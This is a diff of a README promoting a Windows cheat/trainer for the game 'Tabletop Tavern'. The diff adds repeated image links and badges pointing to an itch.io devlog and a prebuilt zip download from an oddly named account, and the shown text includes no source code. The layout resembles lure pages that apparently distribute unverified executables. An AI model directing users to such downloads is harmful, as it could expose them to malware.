@@ -1,17 +1,17 @@
 <div align="center">
 
 ```
-TABLETOP TAVERN — WARBAND CHEAT/TRAINER
+             TABLETOP TAVERN — WARBAND CHEAT/TRAINER
 ```
 
 **`v1.0`** &nbsp;·&nbsp; **`June 2026`** &nbsp;·&nbsp; **`Windows 10/11`** &nbsp;·&nbsp; **`30 Features`**
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-[![Game](https://img.shields.io/badge/Game-Tabletop%20Tavern-orange?style=flat-square&logo=steam)](https://store.steampowered.com)
-[![Version](https://img.shields.io/badge/Version-1.0-red?style=flat-square)](https://github.com)
-[![Features](https://img.shields.io/badge/Features-30-gold?style=flat-square)](https://github.com)
+<a href="https://ro5lynmost1lle4.itch.io/tabletop-tavern-trainer/devlog/1551813/tabletop-tavern-cheat-available"><img src="https://github.com/ro5lynmost1lle4/Tabletop-Tavern-mod-menu/blob/main/army-tabletop.jpg" width="18%" /></a>&nbsp;<a href="https://ro5lynmost1lle4.itch.io/tabletop-tavern-trainer/devlog/1551813/tabletop-tavern-cheat-available"><img src="https://github.com/ro5lynmost1lle4/Tabletop-Tavern-mod-menu/blob/main/battle-tabletop.jpg" width="18%" /></a>&nbsp;<a href="https://ro5lynmost1lle4.itch.io/tabletop-tavern-trainer/devlog/1551813/tabletop-tavern-cheat-available"><img src="https://github.com/ro5lynmost1lle4/Tabletop-Tavern-mod-menu/blob/main/camping-tabletop.jpg" width="18%" /></a>&nbsp;<a href="https://ro5lynmost1lle4.itch.io/tabletop-tavern-trainer/devlog/1551813/tabletop-tavern-cheat-available"><img src="https://github.com/ro5lynmost1lle4/Tabletop-Tavern-mod-menu/blob/main/gear-tabletop.jpg" width="18%" /></a>&nbsp;<a href="https://ro5lynmost1lle4.itch.io/tabletop-tavern-trainer/devlog/1551813/tabletop-tavern-cheat-available"><img src="https://github.com/ro5lynmost1lle4/Tabletop-Tavern-mod-menu/blob/main/economy-tabletop.jpg" width="18%" /></a>
 
 > *Press* **`[INSERT]`** *to open the trainer overlay — then command your campaign.*
+
+[![itch.io](https://img.shields.io/badge/itch.io-Download%20%2F%20Devlog-FA5C5C?style=for-the-badge&logo=itch.io&logoColor=white)](https://ro5lynmost1lle4.itch.io/tabletop-tavern-trainer/devlog/1551813/tabletop-tavern-cheat-available)
+[![Download](https://img.shields.io/badge/⬇%20DOWNLOAD%20v1.0-.zip%20%7C%20Windows%2010%2F11-brightgreen?style=for-the-badge)](https://github.com/ro5lynmost1lle4/Tabletop-Tavern-mod-menu/releases/download/1.0/TabletopTavern_Trainer_v1.0.zip)
 
 🍺 **ROLL THE DICE** 🍺
 
@@ -137,10 +137,13 @@ WarbandTrainer/
 
 ---
 
-<div align="center">
+## 🎲 Also on itch.io
 
-*Built for campaigns. Designed to dominate.*
+> Download, follow updates, and leave feedback on the devlog page:
 
-🍺 **ROLL THE DICE** 🍺 &nbsp;·&nbsp; v1.0 &nbsp;·&nbsp; June 2026
+[![itch.io devlog](https://img.shields.io/badge/itch.io-Tabletop%20Tavern%20Trainer-FA5C5C?style=flat-square&logo=itch.io&logoColor=white)](https://itch.io/devlog/1551813/tabletop-tavern-cheat-available.amp)
 
-</div>
+---
+
+<p align="center"><em>Built for campaigns. Designed to dominate.</em></p>
+<p align="center">🍺 <strong>ROLL THE DICE</strong> 🍺 &nbsp;·&nbsp; v1.0 &nbsp;·&nbsp; June 2026</p>
